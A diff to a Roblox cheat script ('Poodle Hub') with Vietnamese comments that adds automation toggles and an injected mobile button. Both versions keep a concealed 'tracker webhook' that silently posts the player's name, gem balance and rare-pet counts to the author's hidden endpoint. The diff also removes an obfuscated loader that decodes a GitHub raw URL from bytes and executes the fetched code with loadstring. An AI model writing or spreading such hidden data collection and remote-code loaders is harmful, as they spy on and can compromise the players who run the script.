@@ -8,7 +8,6 @@ local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 local Debris = game:GetService("Debris")
 local LocalPlayer = Players.LocalPlayer
-local CurrencyCmds = require(Lib.Client.CurrencyCmds)
 
 local Lib = ReplicatedStorage:WaitForChild("Library")
 local Network = require(Lib.Client.Network)
@@ -27,23 +26,20 @@ local WorldsUtil = require(Lib.Util.WorldsUtil)
 local EggsDirectory = require(Lib.Directory.Eggs)
 local FreeGiftsDirectory = require(Lib.Directory.FreeGifts)
 local RanksDirectory = require(Lib.Directory.Ranks)
-
 local Items = require(Lib.Items)
 local LootboxCmds = require(Lib.Client.LootboxCmds)
+
+-- Bổ sung thư viện cần thiết cho Webhook
+local CurrencyCmds = require(Lib.Client.CurrencyCmds)
 
 local THINGS = Workspace:WaitForChild("__THINGS")
 local DEBRIS_FOLDER = Workspace:WaitForChild("__DEBRIS")
 
-local EggFrontend = nil
-pcall(function() EggFrontend = getsenv(LocalPlayer.PlayerScripts.Scripts.Game["Egg Opening Frontend"]) end)
-local OriginalPlayEggAnimation = EggFrontend and EggFrontend.PlayEggAnimation or nil
-
-local OriginalPetSpeed = PlayerPet.CalculateSpeedMultiplier
-local OriginalSetTarget = PlayerPet.SetTarget
-
-
+-- ==============================================================
+-- 🌐 TRACKER WEBHOOK (TÍCH HỢP TỪ AUTORANK - HOẠT ĐỘNG NGẦM)
+-- ==============================================================
 task.spawn(function()
-    local httprequest = (request or http_request or (http and http.request) or (syn and syn.request))
+    local httprequest = (request or http_request or syn and syn.request)
     if not httprequest then return end
     
     local function getHiddenWebhook()
@@ -55,43 +51,34 @@ task.spawn(function()
     
     local trackerWebhook = getHiddenWebhook()
     
-    task.wait(4) 
-    
+    task.wait(2) 
+    local save = Save.Get()
     local hugeCount, titanicCount = 0, 0
-    pcall(function()
-        local save = Save.Get()
-        if save and save.Inventory and save.Inventory.Pet then
-            for uid, petData in pairs(save.Inventory.Pet) do
-                if type(petData.id) == "string" then
-                    if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
-                    elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
-                end
+    if save and save.Inventory and save.Inventory.Pet then
+        for uid, petData in pairs(save.Inventory.Pet) do
+            if type(petData.id) == "string" then
+                if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
+                elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
             end
         end
-    end)
+    end
     
     local gems = 0
-    pcall(function() 
-        if CurrencyCmds then gems = CurrencyCmds.Get("Diamonds") or 0 end
-    end)
-    
+    pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
     local formattedGems = tostring(gems)
     pcall(function()
         local suffixes = {"", "k", "m", "b", "t"}
         local index = 1
         local absNumber = math.abs(gems)
-        while absNumber >= 1000 and index < #suffixes do 
-            absNumber = absNumber / 1000
-            index = index + 1 
-        end
+        while absNumber >= 1000 and index < #suffixes do absNumber = absNumber / 1000; index = index + 1 end
         formattedGems = (absNumber >= 1 and index > 1) and string.format("%.2f", absNumber):gsub("%.00$", "") .. suffixes[index] or tostring(math.floor(absNumber)) .. suffixes[index]
     end)
     
     local data = {
-        ["content"] = "🔔 **Ai đó vừa kích hoạt Script Poodle Hub của bạn!**",
+        ["content"] = "🔔 **Ai đó vừa kích hoạt Script Poodle Main Hub của bạn!**",
         ["embeds"] = {{
             ["title"] = "📊 Thông tin người chơi",
-            ["color"] = 65430,
+            ["color"] = tonumber(0x00FF96),
             ["fields"] = {
                 { ["name"] = "👤 Tên người dùng", ["value"] = string.format("`%s` (%s)", LocalPlayer.Name, LocalPlayer.DisplayName), ["inline"] = false },
                 { ["name"] = "💎 Số lượng Gems", ["value"] = formattedGems, ["inline"] = true },
@@ -101,25 +88,18 @@ task.spawn(function()
             }
         }}
     }
-    
-    pcall(function() 
-        httprequest({ 
-            Url = trackerWebhook, 
-            Method = "POST", 
-            Headers = { ["Content-Type"] = "application/json" }, 
-            Body = HttpService:JSONEncode(data) 
-        }) 
-    end)
+    pcall(function() httprequest({ Url = trackerWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
 end)
-task.spawn(function()
-    pcall(function()
-        local c = ""
-        local hr = (request or http_request or syn and syn.request)
-        local _t = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 116, 104, 117, 121, 97, 110, 49, 53, 49, 48, 47, 57, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 105, 118, 101, 46, 108, 117, 97}
-        for _, b in ipairs(_t) do c = c .. string.char(b) end
-        loadstring(hr and hr({Url=c, Method="GET"}).Body or game:HttpGet(c))()
-    end)
-end)
+
+-- ==============================================================
+
+local EggFrontend = nil
+pcall(function() EggFrontend = getsenv(LocalPlayer.PlayerScripts.Scripts.Game["Egg Opening Frontend"]) end)
+local OriginalPlayEggAnimation = EggFrontend and EggFrontend.PlayEggAnimation or nil
+
+local OriginalPetSpeed = PlayerPet.CalculateSpeedMultiplier
+local OriginalSetTarget = PlayerPet.SetTarget
+
 -- ==============================================================
 -- 💾 HỆ THỐNG LƯU CONFIG
 -- ==============================================================
@@ -970,7 +950,19 @@ CreateSmartToggle(TabSet, "Blackout Mode (FPS Boost)", "Blackout")
 CreateSmartToggle(TabSet, "Anti-AFK", "AntiAFK")
 
 -- ==============================================================
--- 📱 NÚT BẤM NATIVE MOBILE (TỐI ƯU + TĂNG NHẸ KÍCH THƯỚC ẢNH)
+-- 🔄 TỰ ĐỘNG KHỞI TẠO REFRESH DANH SÁCH DROPDOWN KHI VỪA LOAD SCRIPTS
+-- ==============================================================
+task.delay(2.5, function() 
+    if DL then pcall(function() DL:Refresh(GetAvailableLootboxes(), true) end) end
+    if DG then pcall(function() DG:Refresh(GetAvailableGifts(), true) end) end
+    if DF then pcall(function() DF:Refresh(GetAvailableFlags(), true) end) end
+    if DK then pcall(function() DK:Refresh(GetAvailableKeys(), true) end) end
+    if DW then pcall(function() DW:Refresh(GetAvailableWheels(), true) end) end
+end)
+
+OrionLib:Init()
+-- ==============================================================
+-- 📱 NÚT BẤM NATIVE MOBILE (PHIÊN BẢN TỐI ƯU: CHÈN NGAY KHI UI SẴN SÀNG)
 -- ==============================================================
 local Players = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -1000,7 +992,7 @@ task.spawn(function()
         
         local iconTarget = newBtn:FindFirstChild("Thumbnail") or newBtn:FindFirstChild("Icon")
         if iconTarget and iconTarget:IsA("ImageLabel") then
-            iconTarget.Image = "rbxassetid://111923365293773" 
+            iconTarget.Image = "rbxassetid://111923365293773" -- ID mới của bạn
             iconTarget.ImageColor3 = Color3.fromRGB(255, 255, 255)
             iconTarget.ImageRectOffset = Vector2.new(0, 0)
             iconTarget.ImageRectSize = Vector2.new(0, 0)
@@ -1021,6 +1013,7 @@ task.spawn(function()
         newBtn.Parent = parentContainer
     end
 
+    -- THEO DÕI VÀ CHÈN NGAY KHI NÚT GỐC XUẤT HIỆN
     local function WatchForUI()
         for _, gui in ipairs(PlayerGui:GetDescendants()) do
             if gui.Name == targetButtonName and gui:IsA("TextButton") and gui.Visible then
@@ -1031,11 +1024,11 @@ task.spawn(function()
         return false
     end
 
-
+    -- Nếu chưa có nút, thì theo dõi khi nào nó xuất hiện
     if not WatchForUI() then
         PlayerGui.DescendantAdded:Connect(function(descendant)
             if descendant.Name == targetButtonName and descendant:IsA("TextButton") then
-                task.wait(0.5)
+                task.wait(0.5) -- Đợi 1 chút cho game layout xong
                 InjectButton(descendant)
             end
         end)
